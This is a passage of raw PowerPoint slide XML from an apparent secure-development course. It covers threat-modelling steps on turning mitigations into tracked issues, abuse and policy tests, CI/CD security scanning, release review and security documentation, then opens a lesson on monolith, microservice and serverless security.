              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12262128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D4474-6F1B-92D0-9C47-EA06C07EA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51121-808D-854C-F178-A985F35F2F07}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 07</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{44801730-9F7D-7C3F-CCC9-779858EBC0CF}"/>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Turn Mitigations into Actionable Items</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Create </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>issues</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> with acceptance criteria and owners.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Tag by STRIDE + component (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>STRIDE:I </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>api</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>-gateway</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36770064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FB2B6-77EB-595A-68F0-FDDBCFA0E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D4CF0-60FB-9C45-3429-14BFE6803014}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 08</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{04BC50A8-4833-DC9D-5E3F-E519789E1C97}"/>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Validate with tests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Add </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>abuse tests</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: negative unit tests, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>authz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> tests, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>fuzzers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, regression for fixed vulns.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Include </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>IaC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>policy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> tests (e.g., “S3 buckets must not be public”).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Add </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>threat-specific checks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (regex </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>ReDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> unit test on critical routes, payload size caps)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4093726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90EEE-0046-D3B9-8BB2-1428F753B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D442E-B0D9-707D-7242-B48B9184F1FF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 09</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DB991906-81B2-C0AF-EE1C-2E6E5C4FD92F}"/>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Wire into CI/CD</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>SAST/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>semgrep</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>dependency scanning</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>lockfile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, SBOM), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>IaC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> scanning</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>secret scanning</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>container scan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>DAST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/API security tests on staging; block deploy on P0/P1 open items tied to this release.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30920078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699BD-412F-C1ED-62CB-ED932D874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7DEC9-FA5C-5278-45AC-ADEC1BE09CDB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF2CACD7-9480-27D2-311F-0195CE067E75}"/>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Review before release</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Run a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>STRIDE spot-check</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> on changed components.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Confirm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>monitoring/alerts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> exist for mitigations (e.g., auth failures spike, 429 rate-limit hits, tamper-evident log verification jobs).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5784144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C033D-951E-7519-EA1D-C794E6270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E2738-E12B-7900-D5ED-A320210B312A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 11</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BA62DE7-C1C5-798C-0D9C-EE07559B7B32}"/>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Ship with security docs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Include </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/threat-model/README.md</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> with diagram, threat list, mitigations, and residual risks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Document </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>on-call runbooks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> for the top 3 risks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2931589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7FEB8-22DC-BBFD-7E39-6907C4BEC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40C1C-EF57-CB4A-DA50-E33BB9CE6BE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 12</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0973CF1C-9D5F-9317-3D9C-E27C7B7B635D}"/>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dirty="0"/>
              <a:t>Keep it living</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Re-run STRIDE on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>new features</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>new dependencies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>new trust boundaries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>After incidents/pen tests, add threats + tests to close the loop.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26379641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958A-753A-AC45-9E8D-75BD2A83D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A7346-1577-7027-416E-A386F7DF4804}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1313597"/>
            <a:ext cx="10515600" cy="4237977"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Lesson 02 –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Secure Web Architecture Refresher </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="Cambria"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Topic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 01 – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
              </a:rPr>
              <a:t>Monolith vs Microservices vs Serverless Pattern Security</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Cambria"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="351838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6131C-3ADA-4360-121A-7A04FC2D3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7D53B-247A-40E9-BFCD-21BC1E32C2B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Monoliths</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7DC9A990-2445-9B6A-D11B-3253606636AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="6618015" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>single deployable unit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (e.g., one codebase, one process or a tight bundle) that contains most app concerns: UI, business logic, usually backed by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
